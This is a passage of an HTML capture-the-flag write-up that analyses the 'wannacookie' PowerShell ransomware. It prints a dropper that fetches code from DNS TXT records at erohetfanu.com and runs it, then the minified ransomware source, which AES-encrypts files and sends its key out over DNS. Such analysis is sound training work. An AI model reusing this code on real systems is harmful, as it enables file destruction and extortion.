class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span><span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">};</span> <span class="n">iex</span><span class="p">($(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-string</span><span class="p">))</span>
+</pre></div>
+
+
+<p>What does this code do? </p>
+<ol>
+<li>Declares a function that converts a hex-encoded string to ascii text output</li>
+<li>Defines a couple of variables, one of which is the hex-encoded text string for "wannacookie.min.ps1"</li>
+<li>Sets up a loop that iterates i times, where i is an integer value retrieved from a DNS TXT record 77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com</li>
+<li>Each time the loop executes, it retrieves data from a DNS TXT record i.77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com and concatenates them together into string $h</li>
+<li>After the final iteration, the hex-encoded value of $h is decoded to its text and executed with the iex function</li>
+</ol>
+<p>We can see from this that the domain name used in the malware is <strong>erohetfanu.com</strong>, which completes this part of the objective.</p>
+<h2 id="part-3-stop-the-malware">Part 3: Stop the Malware</h2>
+<h3 id="problem_3">Problem</h3>
+<p>Identify a way to stop the malware in its tracks!</p>
+<h3 id="solution_2">Solution</h3>
+<p>The code we found in part 2 was only a dropper, which is essentially just malware that downloads additional malware.  In order to figure out how to stop the malware, we need to see what the dropper downloaded to Alabaster's computer.</p>
+<p>Using a similar approach as before, we'll remove the <code>iex</code> function from the dropper code and redirect the results to a file.  </p>
+<div class="codehilite"><pre><span></span><span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">};</span> <span class="k">return</span> <span class="nv">$o</span><span class="p">};</span> <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;</span><span class="p">;</span> <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span><span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">};</span> <span class="p">$(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">hhc18</span><span class="p">\</span><span class="n">wannacookie</span><span class="p">.</span><span class="n">min</span><span class="p">.</span><span class="n">ps1</span>
+</pre></div>
+
+
+<p>When we execute this, the output is minified and difficult to read.</p>
+<div class="codehilite"><pre><span></span><span class="nv">$functions</span> <span class="p">=</span> <span class="p">{</span><span class="k">function</span> <span class="n">e_d_file</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span><span class="no">[byte[]]</span><span class="nv">$key</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">;</span><span class="nv">$Suffix</span> <span class="p">=</span> <span class="s2">&quot;`.wannacookie&quot;</span><span class="p">;</span><span class="no">[System.Reflection.Assembly]</span><span class="p">::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">&#39;System.Security.Cryptography&#39;</span><span class="p">);</span><span class="no">[System.Int32]</span><span class="nv">$KeySize</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">.</span><span class="n">Length</span><span class="p">*</span><span class="n">8</span><span class="p">;</span><span class="nv">$AESP</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="s1">&#39;System.Security.Cryptography.AesManaged&#39;</span><span class="p">;</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="no">[System.Security.Cryptography.CipherMode]</span><span class="p">::</span><span class="n">CBC</span><span class="p">;</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="n">128</span><span class="p">;</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="nv">$KeySize</span><span class="p">;</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">;</span><span class="nv">$FileSR</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$File</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Open</span><span class="p">);</span><span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span><span class="nv">$DestFile</span> <span class="p">=</span> <span class="nv">$File</span> <span class="p">+</span> <span class="nv">$Suffix</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$DestFile</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$File</span> <span class="o">-replace</span> <span class="nv">$Suffix</span><span class="p">)};</span><span class="nv">$FileSW</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$DestFile</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Create</span><span class="p">);</span><span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">GenerateIV</span><span class="p">();</span><span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">),</span> <span class="n">0</span><span class="p">,</span> <span class="n">4</span><span class="p">);</span><span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">()}</span> <span class="k">else</span> <span class="p">{</span><span class="no">[Byte[]]</span><span class="nv">$LenIV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">4</span><span class="p">;</span><span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">0</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span><span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">,</span> <span class="n">3</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span><span class="no">[Int]</span><span class="nv">$LIV</span> <span class="p">=</span> <span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">);</span><span class="no">[Byte[]]</span><span class="nv">$IV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$LIV</span><span class="p">;</span><span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">4</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span><span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$LIV</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="nv">$IV</span><span class="p">;</span><span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">()};</span><span class="nv">$CryptoS</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">CryptoStream</span><span class="p">(</span><span class="nv">$FileSW</span><span class="p">,</span> <span class="nv">$Transform</span><span class="p">,</span> <span class="no">[System.Security.Cryptography.CryptoStreamMode]</span><span class="p">::</span><span class="n">Write</span><span class="p">);</span><span class="no">[Int]</span><span class="nv">$Count</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span><span class="no">[Int]</span><span class="nv">$BlockSzBts</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">/</span> <span class="n">8</span><span class="p">;</span><span class="no">[Byte[]]</span><span class="nv">$Data</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$BlockSzBts</span><span class="p">;</span><span class="k">Do</span> <span class="p">{</span><span class="nv">$Count</span> <span class="p">=</span> <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$BlockSzBts</span><span class="p">);</span><span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Count</span><span class="p">)}</span> <span class="k">While</span> <span class="p">(</span><span class="nv">$Count</span> <span class="o">-gt</span> <span class="n">0</span><span class="p">);</span><span class="nv">$CryptoS</span><span class="p">.</span><span class="n">FlushFinalBlock</span><span class="p">();</span><span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span><span class="nv">$FileSR</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span><span class="nv">$FileSW</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span><span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;key&quot;</span><span class="p">;</span><span class="nb">Remove-Item</span> <span class="nv">$File</span><span class="p">}};</span><span class="k">function</span> <span class="n">H2B</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="nv">$HX</span><span class="p">);</span><span class="nv">$HX</span> <span class="p">=</span> <span class="nv">$HX</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">};</span><span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$HX</span><span class="p">){</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="n">16</span><span class="p">)}};</span><span class="k">function</span> <span class="n">A2H</span><span class="p">(){</span><span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$c</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span><span class="nv">$b</span> <span class="p">=</span> <span class="nv">$a</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">();;</span><span class="k">Foreach</span> <span class="p">(</span><span class="nv">$element</span> <span class="k">in</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span><span class="nv">$c</span> <span class="p">=</span> <span class="nv">$c</span> <span class="p">+</span> <span class="s2">&quot; &quot;</span> <span class="p">+</span> <span class="no">[System.String]</span><span class="p">::</span><span class="n">Format</span><span class="p">(</span><span class="s2">&quot;{0:X}&quot;</span><span class="p">,</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToUInt32</span><span class="p">(</span><span class="nv">$element</span><span class="p">))};</span><span class="k">return</span> <span class="nv">$c</span> <span class="o">-replace</span> <span class="s1">&#39; &#39;</span><span class="p">};</span><span class="k">function</span> <span class="n">H2A</span><span class="p">()</span> <span class="p">{</span><span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$outa</span><span class="p">;</span><span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$outa</span> <span class="p">=</span> <span class="nv">$outa</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">};</span><span class="k">return</span> <span class="nv">$outa</span><span class="p">};</span><span class="k">function</span> <span class="n">B2H</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="nv">$DEC</span><span class="p">);</span><span class="nv">$tmp</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$DEC</span><span class="p">){</span><span class="nv">$a</span> <span class="p">=</span> <span class="s2">&quot;{0:x}&quot;</span> <span class="o">-f</span> <span class="no">[Int]</span><span class="nv">$value</span><span class="p">;</span><span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">1</span><span class="p">){</span><span class="nv">$tmp</span> <span class="p">+=</span> <span class="s1">&#39;0&#39;</span> <span class="p">+</span> <span class="nv">$a</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="p">+=</span> <span class="nv">$a</span><span class="p">}};</span><span class="k">return</span> <span class="nv">$tmp</span><span class="p">};</span><span class="k">function</span> <span class="n">ti_rox</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="nv">$b1</span><span class="p">,</span> <span class="nv">$b2</span><span class="p">);</span><span class="nv">$b1</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b1</span><span class="p">);</span><span class="nv">$b2</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b2</span><span class="p">);</span><span class="nv">$cont</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span><span class="p">;</span><span class="k">if</span> <span class="p">(</span><span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="o">-eq</span> <span class="nv">$b2</span><span class="p">.</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span><span class="nv">$cont</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$b1</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$b2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]}};</span><span class="k">return</span> <span class="nv">$cont</span><span class="p">};</span><span class="k">function</span> <span class="n">B2G</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$Data</span><span class="p">);</span><span class="k">Process</span> <span class="p">{</span><span class="nv">$out</span> <span class="p">=</span> <span class="no">[System.IO.MemoryStream]</span><span class="p">::</span><span class="n">new</span><span class="p">();</span><span class="nv">$gStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$out</span><span class="p">,</span> <span class="p">(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Compress</span><span class="p">);</span><span class="nv">$gStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Data</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$gStream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span><span class="k">return</span> <span class="nv">$out</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()}};</span><span class="k">function</span> <span class="n">G2B</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$Data</span><span class="p">);</span><span class="k">Process</span> <span class="p">{</span><span class="nv">$SrcData</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span> <span class="p">,</span> <span class="nv">$Data</span> <span class="p">);</span><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">;</span><span class="nv">$gStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$SrcData</span><span class="p">,</span> <span class="p">(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">);</span><span class="nv">$gStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span> <span class="nv">$output</span> <span class="p">);</span><span class="nv">$gStream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span><span class="nv">$SrcData</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span><span class="no">[byte[]]</span> <span class="nv">$byteArr</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span><span class="k">return</span> <span class="nv">$byteArr</span><span class="p">}};</span><span class="k">function</span> <span class="n">sh1</span><span class="p">(</span><span class="no">[String]</span> <span class="nv">$String</span><span class="p">)</span> <span class="p">{</span><span class="nv">$SB</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">StringBuilder</span><span class="p">;</span><span class="no">[System.Security.Cryptography.HashAlgorithm]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;SHA1&quot;</span><span class="p">).</span><span class="n">ComputeHash</span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$String</span><span class="p">))|%{</span><span class="no">[Void]</span><span class="nv">$SB</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">))};</span><span class="nv">$SB</span><span class="p">.</span><span class="n">ToString</span><span class="p">()};</span><span class="k">function</span> <span class="n">p_k_e</span><span class="p">(</span><span class="nv">$key_bytes</span><span class="p">,</span> <span class="no">[byte[]]</span><span class="nv">$pub_bytes</span><span class="p">){</span><span class="nv">$cert</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">X509Certificates</span><span class="p">.</span><span class="n">X509Certificate2</span><span class="p">;</span><span class="nv">$cert</span><span class="p">.</span><span class="n">Import</span><span class="p">(</span><span class="nv">$pub_bytes</span><span class="p">);</span><span class="nv">$encKey</span> <span class="p">=</span> <span class="nv">$cert</span><span class="p">.</span><span class="n">PublicKey</span><span class="p">.</span><span class="n">Key</span><span class="p">.</span><span class="n">Encrypt</span><span class="p">(</span><span class="nv">$key_bytes</span><span class="p">,</span> <span class="nv">$true</span><span class="p">);</span><span class="k">return</span> <span class="p">$(</span><span class="n">B2H</span> <span class="nv">$encKey</span><span class="p">)};</span><span class="k">function</span> <span class="n">e_n_d</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">,</span> <span class="nv">$make_cookie</span> <span class="p">);</span><span class="nv">$tcount</span> <span class="p">=</span> <span class="n">12</span><span class="p">;</span><span class="k">for</span> <span class="p">(</span> <span class="nv">$file</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$file</span> <span class="o">-lt</span> <span class="nv">$allfiles</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="nv">$file</span><span class="p">++</span>  <span class="p">)</span> <span class="p">{</span><span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span><span class="nv">$running</span> <span class="p">=</span> <span class="p">@(</span><span class="nb">Get-Job</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-eq</span> <span class="s1">&#39;Running&#39;</span> <span class="p">});</span><span class="k">if</span> <span class="p">(</span><span class="nv">$running</span><span class="p">.</span><span class="n">Count</span> <span class="o">-le</span> <span class="nv">$tcount</span><span class="p">)</span> <span class="p">{</span><span class="nb">Start-Job</span>  <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$true_false</span><span class="p">);</span><span class="k">try</span><span class="p">{</span><span class="n">e_d_file</span> <span class="nv">$key</span> <span class="nv">$File</span> <span class="nv">$true_false</span><span class="p">}</span> <span class="k">catch</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="p">$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Desktop\ps_log.txt&#39;</span><span class="p">)</span> <span class="n">-append</span><span class="p">}}</span> <span class="n">-args</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">[</span><span class="nv">$file</span><span class="p">],</span> <span class="nv">$make_cookie</span> <span class="n">-InitializationScript</span> <span class="nv">$functions</span><span class="p">;</span><span class="k">break</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="nb">Start-Sleep</span> <span class="n">-m</span> <span class="n">200</span><span class="p">;</span><span class="k">continue</span><span class="p">}}}};</span><span class="k">function</span> <span class="n">g_o_dns</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span><span class="nv">$h</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">($(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span><span class="nv">$h</span> <span class="p">+=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">};</span><span class="k">return</span> <span class="p">(</span><span class="n">H2A</span> <span class="nv">$h</span><span class="p">)};</span><span class="k">function</span> <span class="n">s_2_c</span><span class="p">(</span><span class="nv">$astring</span><span class="p">,</span> <span class="nv">$size</span><span class="p">=</span><span class="n">32</span><span class="p">)</span> <span class="p">{</span><span class="nv">$new_arr</span> <span class="p">=</span> <span class="p">@();</span><span class="nv">$chunk_index</span><span class="p">=</span><span class="n">0</span><span class="p">;</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">1</span><span class="p">..$(</span><span class="nv">$astring</span><span class="p">.</span><span class="n">length</span> <span class="p">/</span> <span class="nv">$size</span><span class="p">))</span> <span class="p">{</span><span class="nv">$new_arr</span> <span class="p">+=</span> <span class="p">@(</span><span class="nv">$astring</span><span class="p">.</span><span class="n">substring</span><span class="p">(</span><span class="nv">$chunk_index</span><span class="p">,</span><span class="nv">$size</span><span class="p">));</span><span class="nv">$chunk_index</span> <span class="p">+=</span> <span class="nv">$size</span><span class="p">};</span><span class="k">return</span> <span class="nv">$new_arr</span><span class="p">};</span><span class="k">function</span> <span class="n">snd_k</span><span class="p">(</span><span class="nv">$enc_k</span><span class="p">)</span> <span class="p">{</span><span class="nv">$chunks</span> <span class="p">=</span> <span class="p">(</span><span class="n">s_2_c</span> <span class="nv">$enc_k</span> <span class="p">);</span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$j</span> <span class="k">in</span> <span class="nv">$chunks</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$chunks</span><span class="p">.</span><span class="n">IndexOf</span><span class="p">(</span><span class="nv">$j</span><span class="p">)</span> <span class="o">-eq</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$n_c_id</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$j.6B6579666F72626F746964.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">}</span> <span class="k">else</span> <span class="p">{$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">}};</span><span class="k">return</span> <span class="nv">$n_c_id</span><span class="p">};</span><span class="k">function</span> <span class="n">wanc</span> <span class="p">{</span><span class="nv">$S1</span> <span class="p">=</span> <span class="s2">&quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;</span><span class="p">;</span><span class="k">if</span> <span class="p">(</span><span class="nv">$null</span> <span class="o">-ne</span> <span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Name</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span 